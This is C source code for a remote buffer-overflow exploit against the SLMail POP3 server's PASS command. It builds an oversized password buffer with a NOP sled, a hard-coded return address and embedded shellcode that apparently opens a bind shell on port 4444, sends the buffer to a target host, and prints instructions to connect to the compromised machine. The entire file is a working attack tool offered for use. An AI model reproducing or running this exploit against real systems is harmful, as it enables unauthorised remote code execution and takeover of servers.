/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xb8\xea\xf7\xc8\x1e\xdd\xc3\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1"
"\x52\x31\x47\x12\x03\x47\x12\x83\x2d\xf3\x2a\xeb\x4d\x14\x28"
"\x14\xad\xe5\x4d\x9c\x48\xd4\x4d\xfa\x19\x47\x7e\x88\x4f\x64"
"\xf5\xdc\x7b\xff\x7b\xc9\x8c\x48\x31\x2f\xa3\x49\x6a\x13\xa2"
"\xc9\x71\x40\x04\xf3\xb9\x95\x45\x34\xa7\x54\x17\xed\xa3\xcb"
"\x87\x9a\xfe\xd7\x2c\xd0\xef\x5f\xd1\xa1\x0e\x71\x44\xb9\x48"
"\x51\x67\x6e\xe1\xd8\x7f\x73\xcc\x93\xf4\x47\xba\x25\xdc\x99"
"\x43\x89\x21\x16\xb6\xd3\x66\x91\x29\xa6\x9e\xe1\xd4\xb1\x65"
"\x9b\x02\x37\x7d\x3b\xc0\xef\x59\xbd\x05\x69\x2a\xb1\xe2\xfd"
"\x74\xd6\xf5\xd2\x0f\xe2\x7e\xd5\xdf\x62\xc4\xf2\xfb\x2f\x9e"
"\x9b\x5a\x8a\x71\xa3\xbc\x75\x2d\x01\xb7\x98\x3a\x38\x9a\xf4"
"\x8f\x71\x24\x05\x98\x02\x57\x37\x07\xb9\xff\x7b\xc0\x67\xf8"
"\x7c\xfb\xd0\x96\x82\x04\x21\xbf\x40\x50\x71\xd7\x61\xd9\x1a"
"\x27\x8d\x0c\x8c\x77\x21\xff\x6d\x27\x81\xaf\x05\x2d\x0e\x8f"
"\x36\x4e\xc4\xb8\xdd\xb5\x8f\xcc\x2a\xb5\x2a\xb9\x2e\xb5\xb5"
"\x82\xa6\x53\xdf\xe4\xee\xcc\x48\x9c\xaa\x86\xe9\x61\x61\xe3"
"\x2a\xe9\x86\x14\xe4\x1a\xe2\x06\x91\xea\xb9\x74\x34\xf4\x17"
"\x10\xda\x67\xfc\xe0\x95\x9b\xab\xb7\xf2\x6a\xa2\x5d\xef\xd5"
"\x1c\x43\xf2\x80\x67\xc7\x29\x71\x69\xc6\xbc\xcd\x4d\xd8\x78"
"\xcd\xc9\x8c\xd4\x98\x87\x7a\x93\x72\x66\xd4\x4d\x28\x20\xb0"
"\x08\x02\xf3\xc6\x14\x4f\x85\x26\xa4\x26\xd0\x59\x09\xaf\xd4"
"\x22\x77\x4f\x1a\xf9\x33\x7f\x51\xa3\x12\xe8\x3c\x36\x27\x75"
"\xbf\xed\x64\x80\x3c\x07\x15\x77\x5c\x62\x10\x33\xda\x9f\x68"
"\x2c\x8f\x9f\xdf\x4d\x9a";

void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[3001];
      char buf[3012];
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 3012);
      memset(evil, 0x00, 3001);
      memset(evil, 0x43, 3000);
      ptr = &evil;
      ptr = ptr + 652; // 2606
      memcpy(ptr, &nopsled, 16);
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 351);
      *(long*)&evil[2606] = 0x5F4A358F; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
